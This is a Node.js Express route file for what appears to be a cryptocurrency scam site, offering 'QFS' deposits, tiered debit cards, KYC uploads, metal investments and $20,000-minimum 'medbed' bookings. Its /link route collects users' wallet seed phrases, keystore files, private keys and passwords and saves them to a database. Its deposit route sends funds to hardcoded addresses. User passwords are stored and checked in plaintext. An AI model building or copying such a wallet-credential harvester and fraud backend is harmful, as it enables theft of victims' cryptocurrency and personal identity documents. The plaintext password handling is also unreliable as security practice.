import express from "express";
import { ensureAuthenticated } from "../middleware/authMiddleware.js";
import User from "../models/user.model.js";
import { upload } from "../config/cloudinary.js";
import multer from "multer";
import Message from "../models/message.model.js";
import CardOrder from "../models/CardOrder.js";
import QPhone from "../models/QPhone.js";
import KYC from "../models/KYC.js";
import { LinkedWallet } from "../models/LinkedWallet.js";
import crypto from "crypto";
import QRCode from "qrcode";
import Deposit from "../models/Deposit.js";
import Redemption from "../models/Redemption.js";
import Appointment from "../models/Appointment.js"; // Adjust path as needed
import Investment from "../models/Investment.js";

const parseForm = multer();

const userRouter = express.Router();

userRouter.get("/dashboard", ensureAuthenticated, (req, res) => {
  res.render("dashboard", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.get("/profile", ensureAuthenticated, (req, res) => {
  res.render("profile", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post(
  "/profile",
  ensureAuthenticated,
  upload.single("Profile_photo"),
  async (req, res) => {
    try {
      const {
        username,
        fullname,
        email,

        country,
        state,
        phone,
        current_pass_from_form,
        password,
        confirm_password,
      } = req.body;

      // Fetch current user
      const user = await User.findById(req.user.id);
      if (!user) {
        return res.status(200).json({ mssg: "User not found" });
      }

      // Check current password (since no bcrypt)
      if (current_pass_from_form && current_pass_from_form !== user.password) {
        return res.status(200).json({ mssg: "Current password is incorrect" });
      }

      // Handle password update (only if both new passwords match)
      let newPassword = user.password;
      if (password && confirm_password) {
        if (password !== confirm_password) {
          return res.status(200).json({ mssg: "New passwords do not match" });
        }
        newPassword = password;
      }

      // Handle image upload
      const imageUrl = req.file?.path || user.image;

      // Update user fields
      user.username = username || user.username;
      user.fullname = fullname || user.fullname;
      user.email = email || user.email;

      user.country = country || user.country;
      user.state = state || user.state;
      user.phone = phone || user.phone;
      user.password = newPassword;
      user.image = imageUrl;

      await user.save();

      return res.json({
        mssg: "ok",
        user: {
          username: user.username,
          fullname: user.fullname,
          email: user.email,
          phone: user.phone,
          country: user.country,
          state: user.state,

          image: user.image,
        },
      });
    } catch (err) {
      console.error("Error updating profile:", err);
      return res.status(200).json({
        mssg: "Something went wrong while updating your profile",
        error: err.message,
      });
    }
  },
);

userRouter.get("/cards", ensureAuthenticated, (req, res) => {
  res.render("card");
});

// Updated backend endpoint for card requests with all tier data

userRouter.post(
  "/cards",
  ensureAuthenticated,
  upload.single("Poof_of_address"), // handles image upload to Cloudinary
  async (req, res) => {
    try {
      const {
        cardholdersname,
        card_typ, // tier number (1-6)
        card_name, // tier name (Bronze, Silver, Gold, etc.)
        card_price, // price ($18,750, $37,500, etc.)
        card_spend, // spend limit ($25K - $100K, etc.)
        email,
        phone,
        address,
      } = req.body;

      // Validate required fields
      if (
        !cardholdersname ||
        !card_typ ||
        !card_name ||
        !card_price ||
        !card_spend ||
        !email ||
        !phone ||
        !address
      ) {
        return res.json({ mssg: "Please fill in all required fields." });
      }

      // Get image URL from cloudinary
      const proofUrl = req.file?.path || "";

      if (!proofUrl) {
        return res.json({ mssg: "Please upload proof of address." });
      }

      const user = await User.findById(req.user.id);

      if (Number(user.walletValue) < Number(card_price)) {
        return res.status(200).json({ mssg: "Insufficient wallet balance to request a card." });
      }
      // Save to database with all card tier data
      await CardOrder.create({
        user: req.user._id,
        cardholdersname,
        card_typ, // tier number
        card_name, // tier name
        card_price, // price
        card_spend_limit: card_spend, // spend limit
        email,
        phone,
        address,
        proof_of_address: proofUrl,
      });

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error creating card order:", error);
      res.json({ mssg: "Something went wrong. Please try again later." });
    }
  },
);

userRouter.get("/phone", ensureAuthenticated, (req, res) => {
  res.render("phone");
});

// Upload proof of payment to Cloudinary
userRouter.post(
  "/phone",
  ensureAuthenticated,
  upload.single("Poof_of_payment"),
  async (req, res) => {
    try {
      const { wallet_address, amount, fullname, email, phone, address } = req.body;

      const proofUrl = req.file ? req.file.path : null; // Cloudinary URL

      // Save to MongoDB
      const newOrder = new QPhone({
        user: req.user._id,
        wallet_address,
        amount,
        fullname,
        email,
        phone,
        address,
        proof_of_payment: proofUrl,
      });

      await newOrder.save();

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error saving QPhone order:", error);
      res.json({ mssg: "Failed to process order. Please try again later." });
    }
  },
);

userRouter.get("/kyc", ensureAuthenticated, (req, res) => {
  res.render("kyc", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post(
  "/kyc",
  ensureAuthenticated,
  upload.fields([
    { name: "kyc_file_front", maxCount: 1 },
    { name: "kyc_file_back", maxCount: 1 },
  ]),
  async (req, res) => {
    const user = await User.findById(req.user.id);
    console.log("User KYC submission, user:", user);

    try {
      const { doc_typ } = req.body;

      const frontUrl = req.files["kyc_file_front"] ? req.files["kyc_file_front"][0].path : null;
      const backUrl = req.files["kyc_file_back"] ? req.files["kyc_file_back"][0].path : null;

      if (!doc_typ || !frontUrl || !backUrl) {
        return res.json({ mssg: "All fields are required." });
      }

      // Save to DB
      const newKyc = new KYC({
        user: req.user._id,
        doc_typ,
        front_image: frontUrl,
        back_image: backUrl,
      });

      await newKyc.save();

      user.kycSumitted = true;
      await user.save();

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error saving KYC:", error);
      res.json({ mssg: "Failed to upload KYC documents." });
    }
  },
);

userRouter.get("/medical", ensureAuthenticated, (req, res) => {
  res.render("medical");
});
userRouter.get("/contact", ensureAuthenticated, (req, res) => {
  res.render("contact", {
    currentUser: req.user, // pass the user to EJS
  });
});
userRouter.get("/contact-medbed", ensureAuthenticated, (req, res) => {
  res.render("contactMedbed", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/contact", ensureAuthenticated, parseForm.none(), async (req, res) => {
  try {
    const { sender_name, sender_email, sender_subject, sender_mssg } = req.body;

    // Validate input
    if (!sender_name || !sender_email || !sender_subject || !sender_mssg) {
      return res.json({ mssg: "Please fill in all fields." });
    }

    // Save message to MongoDB
    const newMessage = new Message({
      sender_name,
      sender_email,
      sender_subject,
      sender_mssg,
    });

    await newMessage.save();

    // Send success response for AJAX
    res.json({ mssg: "ok" });
  } catch (error) {
    console.error("❌ Error saving contact message:", error);
    res.json({ mssg: "Something went wrong, please try again later." });
  }
});

userRouter.post("/contact-medbed", ensureAuthenticated, parseForm.none(), async (req, res) => {
  try {
    const { sender_name, sender_email, sender_subject, sender_mssg, booking_amount } = req.body;

    // 1. Validate all required fields including the amount
    if (!sender_name || !sender_email || !sender_subject || !sender_mssg || !booking_amount) {
      return res.json({ mssg: "Please fill in all fields." });
    }

    // 2. Validate the minimum amount logic on the server side
    if (Number(booking_amount) < 20000) {
      return res.json({ mssg: "Minimum booking amount is $20,000." });
    }

    // 3. Save Appointment to MongoDB
    const newAppointment = new Appointment({
      user: req.user._id, // Linking the appointment to the logged-in user
      sender_name,
      sender_email,
      sender_subject,
      sender_mssg,
      booking_amount,
      // isApproved will default to false based on your model
    });

    await newAppointment.save();

    // 4. Send success response for AJAX
    res.json({ mssg: "ok" });
  } catch (error) {
    console.error("❌ Error saving appointment:", error);
    res.json({ mssg: "Something went wrong, please try again later." });
  }
});

userRouter.get("/fund", ensureAuthenticated, (req, res) => {
  res.render("securefund", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/fund", ensureAuthenticated, parseForm.none(), (req, res) => {
  res.json({ mssg: "ok" });
});

userRouter.get("/deposit", ensureAuthenticated, (req, res) => {
  res.render("deposit");
});

userRouter.get("/link", ensureAuthenticated, (req, res) => {
  res.render("linkWallet");
});

userRouter.post("/link", ensureAuthenticated, parseForm.none(), async (req, res) => {
  try {
    const { keyid, type_of_login_detail, Phrase, Keystore_json, Private_Key, password } = req.body;

    if (!type_of_login_detail || !keyid) {
      return res.json({ mssg: "Missing wallet type or keyid" });
    }

    const user = await User.findById(req.user.id);
    if (!user) {
      return res.status(200).json({ mssg: "User not found" });
    }

    user.walletConnected = true;
    await user.save();
    let walletData = {
      user: req.user._id,
      keyid,
      type_of_login_detail,
      password: password || null,
    };

    // Dynamically attach whichever field was sent
    if (Phrase) walletData.Phrase = Phrase;
    if (Keystore_json) walletData.Keystore_json = Keystore_json;
    if (Private_Key) walletData.Private_Key = Private_Key;

    // Save to DB
    await LinkedWallet.create(walletData);

    res.json({ mssg: "ok" });
  } catch (err) {
    console.error("❌ Error linking wallet:", err);
    res.json({ mssg: "Something went wrong, please try again." });
  }
});

userRouter.get("/buy", ensureAuthenticated, (req, res) => {
  res.render("buy-crypto", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/deposit2", ensureAuthenticated, async (req, res) => {
  try {
    const { crypto_wallet } = req.body;

    const wallets = {
      bitcoin: {
        name: "Bitcoin",
        address: "bc1q3qx6qsgggnq0cglyqjn9q9z3zmcphgvwp3fnm3",
      },
      ethereum: {
        name: "Ethereum",
        address: "0x1ebbf36b416EaB62458C9D9d3e6aa468993eb104",
      },
      tether: {
        name: "Tether (TRC20)",
        address: "TFh7xSY71qhS8S4xKxs9tk36y2JRMACq17",
      },
      stellar: {
        name: "Stellar",
        address: "0xe78F9419f8eB448F9CF2D14b264bE02BB29Fc9d9",
      },
      ripple: {
        name: "Ripple",
        address: "rPKkEPCD2HYxowMYShcfZpU5Hpkcbbm4Ez",
      },
      litecoin: {
        name: "Litecoin",
        address: "ltc1qx04jsqfw48j6dqd2xqws2jswfhhdw9e0wwm64t",
      },
      doge: {
        name: "DogeCoin",
        address: "DMkq9FJwM5FBGwASFjtqockyxV33n2QhER",
      },
      "shiba-inu": {
        name: "Shiba Inu",
        address: "0x5f172e7eceb2892333617733ea81be47953db3fab043f39bd46cf1453f2be55d",
      },
      tron: {
        name: "Tron",
        address: "UQCRXG4qU1eccrcdOcUNioM9IvDR5BLCRKFQsnAck1ZTFz67",
      },
      cardano: {
        name: "Cardano",
        address: "GBCECILVV2OVUDJ4HJ2OTZPAWOTNWXN5N35T5GAQQENMLSQVTFM5F27Q",
      },
      solana: {
        name: "Solana",
        address: "8FerakH9Ln8c4b4VhZnY65fTrZFVpQJvFK7dCdG8easU",
      },
      "polygon-ecosystem-token": {
        name: "Polygon Ecosystem Token",
        address: "0xe78F9419f8eB448F9CF2D14b264bE02BB29Fc9d9",
      },
      algorand: {
        name: "Algorand",
        address: "ZIKEPAKGEVFMEY4NJWWNGU32PMFYTRGDHND3J3KARYXKNZUS7CNXIKD7YM",
      },
      official_trump: {
        name: "Official Trump",
        address: "TFh7xSY71qhS8S4xKxs9tk36y2JRMACq17",
      },
      pepe: {
        name: "Pepe",
        address: "0x1ebbf36b416EaB62458C9D9d3e6aa468993eb104",
      },
    };

    const walletInfo = wallets[crypto_wallet];
    if (!walletInfo) {
      return res.status(200).send("Invalid crypto wallet selected");
    }

    // Generate QR code for the address
    const qrImage = await QRCode.toDataURL(walletInfo.address);

    // Generate unique transaction ID
    const transactionId = "QFS" + crypto.randomBytes(4).toString("hex").toUpperCase();

    // Render deposit page
    return res.render("deposit2", {
      crypto_wallet: walletInfo.name,
      walletAddress: walletInfo.address,
      qrImage,
      transactionId,
      user: req.user,
    });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server Error");
  }
});

userRouter.post("/confirm-deposit", ensureAuthenticated, async (req, res) => {
  try {
    const { transactionId, wallet, address, amount } = req.body;

    const newDeposit = new Deposit({
      user: req.user._id,
      transactionId,
      wallet,
      address,
      amount,
      status: "pending",
      createdAt: new Date(),
    });

    await newDeposit.save();

    res.json({ mssg: "Deposit recorded successfully! Awaiting confirmation." });
  } catch (err) {
    console.error(err);
    res.status(500).json({ mssg: "Server error" });
  }
});

userRouter.get("/transaction", ensureAuthenticated, async (req, res) => {
  const transactions = await Deposit.find({ user: req.user._id }).sort({ createdAt: -1 });
  res.render("transaction", { transactions });
});

// Redemption form
userRouter.get("/redemption", ensureAuthenticated, (req, res) => {
  res.render("redemption");
});

userRouter.post(
  "/redemption",
  ensureAuthenticated,
  upload.single("redemption_file"),
  async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ mssg: "No file uploaded" });
      }
      // Check if user already has a pending redemption
      const existingRedemption = await Redemption.findOne({
        user: req.user._id,
        status: "pending",
      });

      if (existingRedemption) {
        return res.status(400).json({
          mssg: "You already have a pending redemption form. Please wait for review.",
        });
      }

      const newRedemption = new Redemption({
        user: req.user._id,
        fullname: req.user.fullname,
        email: req.user.email,
        redemption_file: req.file.path,
        status: "pending",
      });

      await newRedemption.save();
      res.setHeader("Content-Type", "application/json");
      res.json({
        mssg: "ok",
        redemptionId: newRedemption._id,
      });
    } catch (error) {
      res.status(500).json({
        mssg: "An error occurred while processing your submission. Please try again.",
      });
    }
  },
);

userRouter.get("/investment", ensureAuthenticated, async (req, res) => {
  const user = await User.findById(req.user.id);

  const holdings = await Investment.aggregate([
    { $match: { user: user._id } },
    {
      $group: {
        _id: "$investment_type",
        totalQty: { $sum: "$quantity" },
        totalSpent: { $sum: "$total_amount" },
      },
    },
  ]);

  const map = { gold: 0, silver: 0, diamond: 0 };
  holdings.forEach((h) => (map[h._id] = h.totalQty));

  const history = await Investment.find({ user: user._id }).sort({ createdAt: -1 }).limit(10);

  res.render("investment", {
    wallet: parseFloat(user.walletValue),
    holdings: map,
    history,
  });
});

userRouter.post("/investment", ensureAuthenticated, async (req, res) => {
  try {
    const { investment_type, quantity, price_per_unit } = req.body;

    const qty = parseFloat(quantity);
    const price = parseFloat(price_per_unit);
    const total = qty * price;

    if (!qty || !price) return res.json({ mssg: "Invalid numbers" });

    const user = await User.findById(req.user.id);
    let wallet = parseFloat(user.walletValue);

    if (wallet < total) return res.json({ mssg: "Insufficient funds, PLease fund your wallet" });

    wallet -= total;
    user.walletValue = wallet.toFixed(2);
    await user.save();

    await Investment.create({
      user: user._id,
      investment_type,
      quantity: qty,
      price_per_unit: price,
      total_amount: total,
      status: "completed",
    });

    res.json({ mssg: "ok", walletValue: wallet });
  } catch {
    res.json({ mssg: "Server error" });
  }
});

// Additional routes for sidebar and withdrawal modal
userRouter.get("/sidebar", (req, res) => {
  res.render("sidebar");
});
userRouter.get("/withdraw", (req, res) => {
  res.render("withdrawal_modal");
});

export default userRouter;
